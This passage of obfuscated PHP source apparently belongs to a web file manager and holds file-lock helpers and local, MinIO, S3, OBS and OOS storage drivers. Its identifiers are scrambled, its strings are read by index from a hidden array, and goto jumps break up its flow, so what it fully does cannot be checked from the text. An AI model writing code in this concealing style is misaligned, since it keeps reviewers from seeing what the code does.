"\x28{$«Ä˜úÒ}\x73\x29\56" . LNG($ÒÌÒ´³«[921]); $éÀ­æ÷È .= $ÒÌÒ´³«[922]; if (is_string(self::$errorMsg) && self::$errorMsg) { $éÀ­æ÷È = $éÀ­æ÷È . $ÒÌÒ´³«[923] . self::$errorMsg; } write_log($ÒÌÒ´³«[924] . sprintf($ÒÌÒ´³«[925], timeFloat() - $ÙŞÍ¤é) . $ÒÌÒ´³«[926] . $ÆØñÚ« . $ÒÌÒ´³«[927] . json_encode(error_get_last()), $ÒÌÒ´³«[917]); show_json($éÀ­æ÷È, !1); } if (!$‹¡¹ ¬ü) { self::$lockItem[$æÉÁâªÉ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $¢ü¤Ù©¬ = number_format(timeFloat() - $±Âï˜€, 3); write_log($ÒÌÒ´³«[928] . $ŒçÂ³” . $ÒÌÒ´³«[929] . $¢ü¤Ù©¬, $ÒÌÒ´³«[917]); } return $˜õæ“µÑ; } public static function lockGet($êõüÕî¢) { $êêôÚ¼ = self::key($êõüÕî¢); if (self::$lockItem[$êêôÚ¼]) { return self::$lockItem[$êêôÚ¼]; } return self::init()->lockGet($êêôÚ¼); } public static function unlock($ÏÖœ¡øç) { $¹õ¹ª¿ =& $_SERVER[Ò°Ì”İ•]; $î¼ô×Š = self::key($ÏÖœ¡øç); self::$lockItem[$î¼ô×Š] = null; self::init()->unlock($î¼ô×Š); if (GLOBAL_DEBUG_LOG_ALL) { write_log($¹õ¹ª¿[930] . $ÏÖœ¡øç, $¹õ¹ª¿[917]); } return; } public static function unlockRuntime() { $‹àÂà© =& $_SERVER[Ò°Ì”İ•]; $À¶Ì½Í = self::init(); $ÃèƒÀíÍ = !1; foreach (self::$lockItem as $Õ¡¾¦´º => $õáÇ›¾‰) { if (!$õáÇ›¾‰) { continue; } $À¶Ì½Í->unlock($Õ¡¾¦´º); if (!$ÃèƒÀíÍ) { $ÃèƒÀíÍ = !0; write_log($‹àÂà©[931] . $Õ¡¾¦´º . $‹àÂà©[85] . get_caller_msg(), $‹àÂà©[917]); continue; } write_log($‹àÂà©[931] . $Õ¡¾¦´º, $‹àÂà©[917]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $çĞè€ƒ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($‹àÂà©[932] . $çĞè€ƒ . $‹àÂà©[933] . ACTION, $‹àÂà©[917]); } } public static function fileLock($ûÇ³òÂŒ) { $›Şµ–ıû =& $_SERVER[Ò°Ì”İ•]; if (!$GLOBALS[$›Şµ–ıû[934]]) { $GLOBALS[$›Şµ–ıû[934]] = array(); } $GLOBALS[$›Şµ–ıû[934]][$ûÇ³òÂŒ] = !1; $ß”É ÃÆ = fopen(DATA_PATH . $ûÇ³òÂŒ . $›Şµ–ıû[935], $›Şµ–ıû[936]); if (!$ß”É ÃÆ) { return !1; } $GLOBALS[$›Şµ–ıû[934]][$ûÇ³òÂŒ] = $ß”É ÃÆ; if (flock($ß”É ÃÆ, LOCK_EX)) { return !0; } self::unlock($ûÇ³òÂŒ); show_json($›Şµ–ıû[937], !1); return !1; } public static function fileUnlock($‘“Ü¹¨Ê) { $ŠşâÍåş =& $_SERVER[Ò°Ì”İ•]; $ÇøäÅ·¶ = $GLOBALS[$ŠşâÍåş[934]][$‘“Ü¹¨Ê]; if (!$ÇøäÅ·¶) { return; } $GLOBALS[$ŠşâÍåş[934]][$‘“Ü¹¨Ê] = !1; flock($ÇøäÅ·¶, LOCK_UN); fclose($ÇøäÅ·¶); } public static function fileUnlockAll() { $Š°ö¾”÷ =& $_SERVER[Ò°Ì”İ•]; if (!isset($GLOBALS[$Š°ö¾”÷[934]]) || !$GLOBALS[$Š°ö¾”÷[934]]) { return; } foreach ($GLOBALS[$Š°ö¾”÷[934]] as $„®¯şÁş => $¾óÁé€×) { if (!$¾óÁé€×) { continue; } $GLOBALS[$Š°ö¾”÷[934]][$„®¯şÁş] = !1; flock($¾óÁé€×, LOCK_UN); fclose($¾óÁé€×); } $GLOBALS[$Š°ö¾”÷[934]] = array(); } } goto e¹•²ÎÁ‰â; CŞÔ‘¢£òĞ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($şüıÉ¨²) { if (substr($şüıÉ¨², 0, 2) == $_SERVER[Ò°Ì”İ•][1407]) { $şüıÉ¨² = BASIC_PATH . substr($şüıÉ¨², 2); } return $şüıÉ¨²; } public function iconvApp($Æ‹¾¼€ö) { $ÖŞêîøŞ =& $_SERVER[Ò°Ì”İ•]; global $config; return $this->iconvTo($Æ‹¾¼€ö, $config[$ÖŞêîøŞ[1436]], $config[$ÖŞêîøŞ[1435]]); } public function iconvSystem($»ÍÒ¾Û) { $ÀÌ½˜ˆÎ =& $_SERVER[Ò°Ì”İ•]; global $config; return $this->iconvTo($»ÍÒ¾Û, $config[$ÀÌ½˜ˆÎ[1435]], $config[$ÀÌ½˜ˆÎ[1436]]); } public function getPathOuter($ÉÇÎ”Ò) { $ÂŒï˜³¥ =& $_SERVER[Ò°Ì”İ•]; $ãˆ ßØ¥ = $this->iconvApp($this->pathBase); $ÉÇÎ”Ò = $this->iconvApp($ÉÇÎ”Ò); if (substr($ãˆ ßØ¥, 0, 2) == $ÂŒï˜³¥[1407]) { $ãˆ ßØ¥ = BASIC_PATH . substr($ãˆ ßØ¥, 2); } if (substr($ÉÇÎ”Ò, 0, 2) == $ÂŒï˜³¥[1407]) { $ÉÇÎ”Ò = BASIC_PATH . substr($ÉÇÎ”Ò, 2); } $ãˆ ßØ¥ = KodIO::clear($ãˆ ßØ¥); $ÉÇÎ”Ò = KodIO::clear($ÉÇÎ”Ò); $ÉÇÎ”Ò = substr($ÉÇÎ”Ò, strlen($ãˆ ßØ¥)); if (empty($this->pathDriver)) { return $ÉÇÎ”Ò; } return $this->pathDriver . $ÂŒï˜³¥[8] . ltrim($ÉÇÎ”Ò, $ÂŒï˜³¥[8]); } public function mkfile($ÊÑåé¼é, $”™¨Áî¹ = '', $ÂÍ·ªëû = REPEAT_RENAME) { $ÊÑåé¼é = $this->iconvSystem($ÊÑåé¼é); @touch($ÊÑåé¼é); if ($”™¨Áî¹) { file_put_contents($ÊÑåé¼é, $”™¨Áî¹); } @chmod($ÊÑåé¼é, $this->pathAuth); if (is_file($ÊÑåé¼é)) { return $this->getPathOuter($ÊÑåé¼é); } $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][1447], !0); return !1; } public function mkdir($§ş‹ÍÏ¢, $¹ñ×ºª« = REPEAT_SKIP) { $§ş‹ÍÏ¢ = $this->iconvSystem($§ş‹ÍÏ¢); if (is_dir($§ş‹ÍÏ¢)) { return $this->getPathOuter($§ş‹ÍÏ¢); } @mkdir($§ş‹ÍÏ¢, $this->pathAuth, !0); @chmod($§ş‹ÍÏ¢, $this->pathAuth); if (is_dir($§ş‹ÍÏ¢)) { return $this->getPathOuter($§ş‹ÍÏ¢); } $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][1447], !0); return !1; } public function copyFile($°Š‰µ—, $ü”Í‘˜ø) { $this->mkdir($this->pathFather($ü”Í‘˜ø)); $°Š‰µ— = $this->iconvSystem($°Š‰µ—); $ü”Í‘˜ø = $this->iconvSystem($ü”Í‘˜ø); $”šŸ¨¡Î = copy_64($°Š‰µ—, $ü”Í‘˜ø); @chmod($ü”Í‘˜ø, $this->pathAuth); if ($”šŸ¨¡Î) { return $this->getPathOuter($ü”Í‘˜ø); } $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][1447], !0); return !1; } public function moveFile($Ë ¡¹¢¥, $ÁÍ¯×µÎ) { $this->mkdir($this->pathFather($ÁÍ¯×µÎ)); $Ë ¡¹¢¥ = $this->iconvSystem($Ë ¡¹¢¥); $ÁÍ¯×µÎ = $this->iconvSystem($ÁÍ¯×µÎ); $’£ğéã› = intval(@rename($Ë ¡¹¢¥, $ÁÍ¯×µÎ)); if (!$’£ğéã›) { if ($’£ğéã› = intval(@copy_64($Ë ¡¹¢¥, $ÁÍ¯×µÎ))) { @unlink($Ë ¡¹¢¥); } } @chmod($ÁÍ¯×µÎ, $this->pathAuth); if ($’£ğéã›) { return $this->getPathOuter($ÁÍ¯×µÎ); } $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][1447], !0); return !1; } public function movePath($ŠæúİÕ, $­¨‡îñÕ, $¼”’¤‚™ = false) { $ÈÅê ò =& $_SERVER[Ò°Ì”İ•]; $ŠæúİÕ = $this->iconvSystem($ŠæúİÕ); $­¨‡îñÕ = $this->iconvSystem($­¨‡îñÕ); $èÙÑè³ƒ = rtrim($­¨‡îñÕ, $ÈÅê ò[8]) . $ÈÅê ò[8] . ($¼”’¤‚™ ? $¼”’¤‚™ : get_path_this($ŠæúİÕ)); if (file_exists($èÙÑè³ƒ)) { return !1; } $ß¦°†¶œ = intval(@rename($ŠæúİÕ, $èÙÑè³ƒ)); $ß¦°†¶œ = file_exists($èÙÑè³ƒ); if ($ß¦°†¶œ) { return $this->getPathOuter($èÙÑè³ƒ); } $this->writeLog(__FUNCTION__ . $ÈÅê ò[1447], !0); return !1; } public function delFile($ú¹ßÌ‚) { $ú¹ßÌ‚ = $this->iconvSystem($ú¹ßÌ‚); if (!@unlink($ú¹ßÌ‚)) { @chmod($ú¹ßÌ‚, $this->pathAuth); if (@unlink($ú¹ßÌ‚)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][1447], !0); return !1; } return !0; } public function delFolder($¢ô˜‘î) { $µı›Ö¿ =& $_SERVER[Ò°Ì”İ•]; $¢ô˜‘î = $this->iconvSystem($¢ô˜‘î); if (!is_dir($¢ô˜‘î)) { return !0; } if (!($úüòÒè¹ = opendir($¢ô˜‘î))) { return !1; } while (($ìû«¶¢× = readdir($úüòÒè¹)) !== !1) { if ($ìû«¶¢× == $µı›Ö¿[10] || $ìû«¶¢× == $µı›Ö¿[1359]) { continue; } $ô‰İÊ±¸ = $¢ô˜‘î . $µı›Ö¿[8] . $ìû«¶¢×; if (is_file($ô‰İÊ±¸) || is_link($ô‰İÊ±¸)) { if (!unlink($ô‰İÊ±¸)) { chmod($ô‰İÊ±¸, $this->pathAuth); if (!unlink($ô‰İÊ±¸)) { return !1; } } } else { if (is_dir($ô‰İÊ±¸)) { chmod($ô‰İÊ±¸, $this->pathAuth); $ô‰İÊ±¸ = $this->iconvApp($ô‰İÊ±¸); if (!$this->delFolder($ô‰İÊ±¸)) { return !1; } } } } closedir($úüòÒè¹); return rmdir($¢ô˜‘î); } public function rename($ÃÑÄ¡ºú, $áà¼©¬Ó) { $ÆŸ«®Í· =& $_SERVER[Ò°Ì”İ•]; $›Ôô‹“ = $this->fileNameAuto($this->pathFather($ÃÑÄ¡ºú), $áà¼©¬Ó); $›Ôô‹“ = $this->iconvSystem($›Ôô‹“); $ÃÑÄ¡ºú = $this->iconvSystem($ÃÑÄ¡ºú); $‡ìƒ›±… = $this->pathFather($ÃÑÄ¡ºú); $˜«Ö¤¦ = rtrim($‡ìƒ›±…, $ÆŸ«®Í·[8]) . $ÆŸ«®Í·[8] . $›Ôô‹“; $¹§Ñ˜çú = @rename($ÃÑÄ¡ºú, $˜«Ö¤¦); $˜«Ö¤¦ = $this->iconvApp($˜«Ö¤¦); if ($¹§Ñ˜çú) { return $this->getPathOuter($˜«Ö¤¦); } $this->writeLog(__FUNCTION__ . $ÆŸ«®Í·[1447], !0); return !1; } public function size($î‘ÏçÛö) { $î‘ÏçÛö = $this->iconvSystem($î‘ÏçÛö); return filesize_64($î‘ÏçÛö); } public function info($ƒğë­µì) { $ƒğë­µì = $this->iconvSystem($ƒğë­µì); if ($this->isFolder($ƒğë­µì)) { return $this->folderInfo($ƒğë­µì); } else { if ($this->isFile($ƒğë­µì)) { return $this->fileInfo($ƒğë­µì); } } return !1; } protected function infoChildren($ø«ÑØ‚Ÿ, &$ËÈŸÄñĞ, $â— ™ğŠ = true) { $Æ³úä¹ø =& $_SERVER[Ò°Ì”İ•]; check_abort_echo(); $ø«ÑØ‚Ÿ = rtrim($ø«ÑØ‚Ÿ, $Æ³úä¹ø[8]) . $Æ³úä¹ø[8]; if ($â— ™ğŠ) { $ø«ÑØ‚Ÿ = $this->iconvSystem($ø«ÑØ‚Ÿ); } if (!($ÀíÉøóĞ = @opendir($ø«ÑØ‚Ÿ))) { return; } while (($´Èº’Û° = readdir($ÀíÉøóĞ)) !== !1) { if ($´Èº’Û° == $Æ³úä¹ø[10] || $´Èº’Û° == $Æ³úä¹ø[1359]) { continue; } $üÙµçõí = $ø«ÑØ‚Ÿ . $´Èº’Û°; if (is_file($üÙµçõí) || is_link($üÙµçõí)) { $ËÈŸÄñĞ[$Æ³úä¹ø[91]]++; $ËÈŸÄñĞ[$Æ³úä¹ø[90]] += filesize_64($üÙµçõí); } else { if (is_dir($üÙµçõí)) { $ËÈŸÄñĞ[$Æ³úä¹ø[92]]++; $this->infoChildren($üÙµçõí, $ËÈŸÄñĞ, !1); } } } closedir($ÀíÉøóĞ); } private function folderInfo($«í£Ä¹Ê, $ÔÙ¸êä = false) { $ÄäÚûèÂ =& $_SERVER[Ò°Ì”İ•]; $«í£Ä¹Ê = rtrim($«í£Ä¹Ê, $ÄäÚûèÂ[8]) . $ÄäÚûèÂ[8]; $‡Ëüşö = $this->iconvApp($this->pathThis($«í£Ä¹Ê)); if ($ÔÙ¸êä) { return array($ÄäÚûèÂ[32] => $‡Ëüşö, $ÄäÚûèÂ[98] => $this->getPathOuter($«í£Ä¹Ê), $ÄäÚûèÂ[33] => $ÄäÚûèÂ[89]); } $ƒÅÈÛÊ = array($ÄäÚûèÂ[32] => $‡Ëüşö, $ÄäÚûèÂ[98] => $this->getPathOuter($«í£Ä¹Ê), $ÄäÚûèÂ[33] => $ÄäÚûèÂ[89], $ÄäÚûèÂ[244] => @filectime($«í£Ä¹Ê), $ÄäÚûèÂ[99] => @filemtime($«í£Ä¹Ê), $ÄäÚûèÂ[1451] => @fileatime($«í£Ä¹Ê), $ÄäÚûèÂ[1452] => is_readable($«í£Ä¹Ê), $ÄäÚûèÂ[1453] => is_writable($«í£Ä¹Ê), $ÄäÚûèÂ[1454] => get_mode($«í£Ä¹Ê)); return $ƒÅÈÛÊ; } private function fileInfo($ğëš´Ö¡, $ò¥‚úÉ¨ = false) { $ûÕßšñ¯ =& $_SERVER[Ò°Ì”İ•]; $Éµò±  = $this->iconvApp($this->pathThis($ğëš´Ö¡)); if ($ò¥‚úÉ¨) { return array($ûÕßšñ¯[32] => $Éµò± , $ûÕßšñ¯[98] => $this->getPathOuter($ğëš´Ö¡), $ûÕßšñ¯[33] => $ûÕßšñ¯[243], $ûÕßšñ¯[90] => $this->size($ğëš´Ö¡), $ûÕßšñ¯[180] => $this->ext($Éµò± )); } $×…ø¸âè = array($ûÕßšñ¯[32] => $Éµò± , $ûÕßšñ¯[98] => $this->getPathOuter($ğëš´Ö¡), $ûÕßšñ¯[33] => $ûÕßšñ¯[243], $ûÕßšñ¯[244] => @filectime($ğëš´Ö¡), $ûÕßšñ¯[99] => @filemtime($ğëš´Ö¡), $ûÕßšñ¯[1451] => @fileatime($ğëš´Ö¡), $ûÕßšñ¯[90] => $this->size($ğëš´Ö¡), $ûÕßšñ¯[180] => $this->ext($Éµò± ), $ûÕßšñ¯[1452] => is_readable($ğëš´Ö¡), $ûÕßšñ¯[1453] => is_writable($ğëš´Ö¡), $ûÕßšñ¯[1454] => get_mode($ğëš´Ö¡)); return $×…ø¸âè; } public function exist($ğÏİÌ®™) { $ğÏİÌ®™ = $this->iconvSystem($ğÏİÌ®™); return @file_exists($ğÏİÌ®™); } public function isFile($“é†¿Ø) { $“é†¿Ø = $this->iconvSystem($“é†¿Ø); return @is_file($“é†¿Ø); } public function isFolder($Ñæ—ú½¾) { $Ñæ—ú½¾ = $this->iconvSystem($Ñæ—ú½¾); return @is_dir($Ñæ—ú½¾); } public function listPath($‹àÈ×äŒ, $‰ŠÙ°˜ = false) { $ğôˆ‰ù‰ =& $_SERVER[Ò°Ì”İ•]; $‹àÈ×äŒ = $this->iconvSystem($‹àÈ×äŒ); $‹àÈ×äŒ = rtrim($‹àÈ×äŒ, $ğôˆ‰ù‰[8]) . $ğôˆ‰ù‰[8]; $±ï¸Â¶ò = array($ğôˆ‰ù‰[96] => array(), $ğôˆ‰ù‰[97] => array()); if (!($óúàÆ³ = @opendir($‹àÈ×äŒ))) { return $±ï¸Â¶ò; } while (($Êñ™Ö´ = readdir($óúàÆ³)) !== !1) { if ($Êñ™Ö´ == $ğôˆ‰ù‰[10] || $Êñ™Ö´ == $ğôˆ‰ù‰[1359]) { continue; } $üØ»õåª = $‹àÈ×äŒ . $Êñ™Ö´; if (is_file($üØ»õåª)) { $±ï¸Â¶ò[$ğôˆ‰ù‰[97]][] = $this->fileInfo($üØ»õåª, $‰ŠÙ°˜); } else { $±ï¸Â¶ò[$ğôˆ‰ù‰[96]][] = $this->folderInfo($üØ»õåª, $‰ŠÙ°˜); } } closedir($óúàÆ³); return $±ï¸Â¶ò; } public function listAll($ ¹íõ‰, &$µÓŞ‰¹ = array()) { $”¤®ãÀ =& $_SERVER[Ò°Ì”İ•]; $ ¹íõ‰ = $this->iconvSystem($ ¹íõ‰); $ ¹íõ‰ = rtrim($ ¹íõ‰, $”¤®ãÀ[8]) . $”¤®ãÀ[8]; if (!($²Œœˆè÷ = @opendir($ ¹íõ‰))) { return $µÓŞ‰¹; } while (($÷ ğóÑÂ = readdir($²Œœˆè÷)) !== !1) { if ($÷ ğóÑÂ == $”¤®ãÀ[10] || $÷ ğóÑÂ == $”¤®ãÀ[1359]) { continue; } $íÑçË° = $ ¹íõ‰ . $÷ ğóÑÂ; $ø“®ŞÊ¾ = is_dir($íÑçË°) && !is_link($íÑçË°) ? 1 : 0; $íÑçË° = $ø“®ŞÊ¾ ? $íÑçË° . $”¤®ãÀ[8] : $íÑçË°; $µÓŞ‰¹[] = array($”¤®ãÀ[98] => $íÑçË°, $”¤®ãÀ[89] => $ø“®ŞÊ¾, $”¤®ãÀ[99] => intval(@filemtime($íÑçË°)), $”¤®ãÀ[90] => $ø“®ŞÊ¾ ? 0 : intval($this->size($íÑçË°))); if ($ø“®ŞÊ¾) { $this->listAll($íÑçË°, $µÓŞ‰¹); } } closedir($²Œœˆè÷); return $µÓŞ‰¹; } public function has($¤±¬Øşş, $·âØµ‘® = false, $áÇùüË = true) { $—ù´ÀËù =& $_SERVER[Ò°Ì”İ•]; $¤±¬Øşş = $this->iconvSystem($¤±¬Øşş); $¤±¬Øşş = rtrim($¤±¬Øşş, $—ù´ÀËù[8]) . $—ù´ÀËù[8]; if (!($Ó—ËÀ»¢ = @opendir($¤±¬Øşş))) { return !1; } $¢Ğõ·¿´ = 0; $–Ä®ª‚Ï = 0; $üÁ‚ºñ£ = 0; while (($àºİ˜Ş— = readdir($Ó—ËÀ»¢)) !== !1) { if ($àºİ˜Ş— == $—ù´ÀËù[10] || $àºİ˜Ş— == $—ù´ÀËù[1359]) { continue; } $Î¢­«ı¶ = $¤±¬Øşş . $àºİ˜Ş—; if ($·âØµ‘®) { $üÁ‚ºñ£++; if (@is_file($Î¢­«ı¶)) { $¢Ğõ·¿´++; } else { $–Ä®ª‚Ï++; } if ($üÁ‚ºñ£ > 10000) { break; } continue; } if ($áÇùüË) { if (@is_file($Î¢­«ı¶)) { return !0; } } else { if (@is_dir($Î¢­«ı¶ . $—ù´ÀËù[8])) { return !0; } } } closedir($Ó—ËÀ»¢); if ($·âØµ‘®) { return array($—ù´ÀËù[252] => $¢Ğõ·¿´, $—ù´ÀËù[253] => $–Ä®ª‚Ï); } return !1; } public function hashSimple($ö±Ö¢şñ) { $×Úš÷™Ğ =& $_SERVER[Ò°Ì”İ•]; if (!$ö±Ö¢şñ) { return md5($×Úš÷™Ğ[12]); } $ö±Ö¢şñ = $this->iconvSystem($ö±Ö¢şñ); $¯÷ï“¦Ç = $this->size($ö±Ö¢şñ); $²Èƒ¬”Í = 200; $³ÉÖ¯°û = 50; if ($¯÷ï“¦Ç <= $²Èƒ¬”Í * $³ÉÖ¯°û) { return $this->hashMd5($ö±Ö¢şñ) . $¯÷ï“¦Ç; } $•à‘—«ƒ = $×Úš÷™Ğ[12]; $òù¿»¿Ñ = intval($¯÷ï“¦Ç / $³ÉÖ¯°û); $Á£ªË = fopen($ö±Ö¢şñ, $×Úš÷™Ğ[1455]); if (!$Á£ªË) { return $•à‘—«ƒ; } for ($ÃôÏÓóİ = 0; $ÃôÏÓóİ < $³ÉÖ¯°û; $ÃôÏÓóİ++) { fseek_64($Á£ªË, $òù¿»¿Ñ * $ÃôÏÓóİ); $•à‘—«ƒ .= fread($Á£ªË, $²Èƒ¬”Í); } fseek_64($Á£ªË, $¯÷ï“¦Ç - $²Èƒ¬”Í); $•à‘—«ƒ .= fread($Á£ªË, $²Èƒ¬”Í); fclose($Á£ªË); return md5($•à‘—«ƒ) . $¯÷ï“¦Ç; } public function getContent($Õ×§¹©) { $Õ×§¹© = $this->iconvSystem($Õ×§¹©); return file_get_contents($Õ×§¹©); } public function setContent($öú€“, $¶ÈÀ£öÁ = '') { $öú€“ = $this->iconvSystem($öú€“); $°ÜõäáÕ = @file_put_contents($öú€“, $¶ÈÀ£öÁ, LOCK_EX); if (!$°ÜõäáÕ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][1447], !0); } clearstatcache(); @chmod($öú€“, $this->pathAuth); return $°ÜõäáÕ === !1 ? !1 : !0; } public function fileSubstr($‰­§’ ò, $ˆšöáö¥ = 0, $§ÏıÕ©… = false) { $ó•‰òÂÔ =& $_SERVER[Ò°Ì”İ•]; $‰­§’ ò = $this->iconvSystem($‰­§’ ò); if ($§ÏıÕ©… === !1) { $§ÏıÕ©… = $this->size($‰­§’ ò); } if ($§ÏıÕ©… <= 0) { return $ó•‰òÂÔ[12]; } $şÓáÕ²  = fopen($‰­§’ ò, $ó•‰òÂÔ[1455]); if (!$şÓáÕ² ) { return !1; } fseek_64($şÓáÕ² , $ˆšöáö¥); $‚š–×È = fread($şÓáÕ² , $§ÏıÕ©…); fclose($şÓáÕ² ); if (!$‚š–×È) { $this->writeLog(__FUNCTION__ . $ó•‰òÂÔ[1447], !0); } return $‚š–×È; } public function upload($‰ª²´…´, $´¡ù¶ò, $¾Š²¾Ä• = false, $ç­ÄÒÊŞ = REPEAT_REPLACE) { if ($¾Š²¾Ä•) { return $this->moveFile($´¡ù¶ò, $‰ª²´…´); } return $this->copyFile($´¡ù¶ò, $‰ª²´…´); } public function setModifyTime($“ëĞã¯, $éˆÆ‰½ = '') { @touch($“ëĞã¯, intval($éˆÆ‰½)); } public function download($¬‡œ‡¾…, $§¢Ú’) { return $this->iconvSystem($¬‡œ‡¾…); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ß¢«Œı–) { parent::__construct($ß¢«Œı–); $this->setSignVersion($_SERVER[Ò°Ì”İ•][260]); } public function fileOutImage($û‡ŞÑİ, $Í·Ê¼½á = 250) { $¹õ—éÏÚ =& $_SERVER[Ò°Ì”İ•]; if ($this->size($û‡ŞÑİ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($û‡ŞÑİ, $Í·Ê¼½á); } $ƒñ¼ƒÔĞ = array($¹õ—éÏÚ[1456] => $¹õ—éÏÚ[1457] . $Í·Ê¼½á . $¹õ—éÏÚ[1458]); $…Ü·Ë©Ø = $this->link($û‡ŞÑİ, $ƒñ¼ƒÔĞ); $this->fileOutLink($…Ü·Ë©Ø); } public function fileOutLink($ùµ±òµ‚) { $ÍÁÕï– =& $_SERVER[Ò°Ì”İ•]; if (substr($ùµ±òµ‚, 0, 7) == $ÍÁÕï–[229]) { $ùµ±òµ‚ = $ÍÁÕï–[230] . substr($ùµ±òµ‚, 7); } header($ÍÁÕï–[186] . $ùµ±òµ‚); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($û›Ëµå‚) { parent::__construct($û›Ëµå‚); $this->setSignVersion($_SERVER[Ò°Ì”İ•][260]); } public function fileOutLink($€şÕ»¿) { $î›õçç =& $_SERVER[Ò°Ì”İ•]; if (substr($€şÕ»¿, 0, 7) == $î›õçç[229]) { $€şÕ»¿ = $î›õçç[230] . substr($€şÕ»¿, 7); } header($î›õçç[186] . $€şÕ»¿); die; } public function uploadFormData($—…‹Øˆ•, $Ò’„ÒòØ = 3600) { return $this->uploadFormDataV2($—…‹Øˆ•, $Ò’„ÒòØ); } } goto EÛ…Ãêˆ÷°; EˆÁäùÉøÏ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($­ß‰°Çå) { $­ÂÔÏÏ =& $_SERVER[Ò°Ì”İ•]; parent::__construct($­ß‰°Çå); $this->setSignVersion($­ÂÔÏÏ[260]); if (!$this->region) { $this->region = $­ÂÔÏÏ[317]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ò‚–îŒÍ = $this->getBktRegion(); return $this->region == $ò‚–îŒÍ ? !0 : !1; } public function uploadFormData($›ÁÚ’èì, $¸üı‘Çœ = 3600) { $à§ê¯Õ =& $_SERVER[Ò°Ì”İ•]; $©‰²¸ì  = $à§ê¯Õ[242]; $ğÑ²‹’¤ = $à§ê¯Õ[270]; $İŞß²ó£ = $à§ê¯Õ[73]; $à°á»Ù„ = gmdate($à§ê¯Õ[271]); $š–öÃŒ› = gmdate($à§ê¯Õ[272]); $²ååìéÒ = $à§ê¯Õ[273]; $¥ª¤ı = $¸üı‘Çœ . $à§ê¯Õ[12]; $ö„ı’´Ì = $à§ê¯Õ[274]; $ë—üÔú” = array($this->accessKey, $š–öÃŒ›, $this->region, $İŞß²ó£, $²ååìéÒ); $ş™’Æ ™ = implode($à§ê¯Õ[8], $ë—üÔú”); $Ü„éö¿ã = array($à§ê¯Õ[275] => gmdate($à§ê¯Õ[276], strtotime($à§ê¯Õ[277])), $à§ê¯Õ[278] => array(array($à§ê¯Õ[279] => $this->bucket), array($à§ê¯Õ[318] => $©‰²¸ì ), array($à§ê¯Õ[280], $à§ê¯Õ[281], $à§ê¯Õ[12]), array($à§ê¯Õ[280], $à§ê¯Õ[282], $à§ê¯Õ[12]), array($à§ê¯Õ[280], $à§ê¯Õ[319], $à§ê¯Õ[12]), array($à§ê¯Õ[283] => $ö„ı’´Ì), array($à§ê¯Õ[284] => $ş™’Æ ™), array($à§ê¯Õ[285] => $ğÑ²‹’¤), array($à§ê¯Õ[286] => $à°á»Ù„), array($à§ê¯Õ[287] => $¥ª¤ı))); $ãâç›§Ì = base64_encode(json_encode($Ü„éö¿ã)); $¼¨«´Ê° = hash_hmac($à§ê¯Õ[288], $š–öÃŒ›, $à§ê¯Õ[289] . $this->secret, !0); $±‡ÉñÖÇ = hash_hmac($à§ê¯Õ[288], $this->region, $¼¨«´Ê°, !0); $Ö÷°Ëü = hash_hmac($à§ê¯Õ[288], $İŞß²ó£, $±‡ÉñÖÇ, !0); $‰ÎõïŒí = hash_hmac($à§ê¯Õ[288], $²ååìéÒ, $Ö÷°Ëü, !0); $ç¶íÊ¡ß = hash_hmac($à§ê¯Õ[288], $ãâç›§Ì, $‰ÎõïŒí); $ÙÙõ‡‚¤ = array($à§ê¯Õ[259] => $à§ê¯Õ[12], $à§ê¯Õ[306] => $à§ê¯Õ[12], $à§ê¯Õ[318] => $©‰²¸ì , $à§ê¯Õ[283] => $ö„ı’´Ì, $à§ê¯Õ[290] => $ãâç›§Ì, $à§ê¯Õ[320] => $ş™’Æ ™, $à§ê¯Õ[321] => $ğÑ²‹’¤, $à§ê¯Õ[322] => $à°á»Ù„, $à§ê¯Õ[323] => $¥ª¤ı, $à§ê¯Õ[324] => $ç¶íÊ¡ß, $à§ê¯Õ[219] => $this->getHost()); return $ÙÙõ‡‚¤; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Â¾Òû­Ä) { $é¶„Á€À =& $_SERVER[Ò°Ì”İ•]; parent::__construct($Â¾Òû­Ä); $çÎ›ÀÖ = isset($Â¾Òû­Ä[$é¶„Á€À[269]]) && $Â¾Òû­Ä[$é¶„Á€À[269]] == $é¶„Á€À[260] ? $é¶„Á€À[260] : $é¶„Á€À[325]; $this->setSignVersion($çÎ›ÀÖ); } public function link($‚ºóªÖ, $Ñ‚ÃĞÎ‰ = array()) { return parent::link($‚ºóªÖ, $Ñ‚ÃĞÎ‰); } public function fileOut($Ïè‚ÆÎÆ, $—åÜ…Ó = false, $ö°œİ—ø = false, $Ÿ÷Ûß± = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ò°Ì”İ•][326])) { return parent::fileOutServer($Ïè‚ÆÎÆ, $—åÜ…Ó, $ö°œİ—ø, $Ÿ÷Ûß±); } parent::fileOut($Ïè‚ÆÎÆ, $—åÜ…Ó, $ö°œİ—ø, $Ÿ÷Ûß±); } public function fileOutImage($Ã€Õœšì, $İ¦¥¨´… = 250) { if (strstr($this->endpoint, $_SERVER[Ò°Ì”İ•][326])) { return parent::fileOutImageServer($Ã€Õœšì, $İ¦¥¨´…); } parent::fileOutImage($Ã€Õœšì, $İ¦¥¨´…); } public function fileOutLink($„™õ÷­Ü) { $ÀÃ£İß =& $_SERVER[Ò°Ì”İ•]; if (substr($„™õ÷­Ü, 0, 7) == $ÀÃ£İß[229]) { $„™õ÷­Ü = $ÀÃ£İß[230] . substr($„™õ÷­Ü, 7); } header($ÀÃ£İß[186] . $„™õ÷­Ü); die; } } 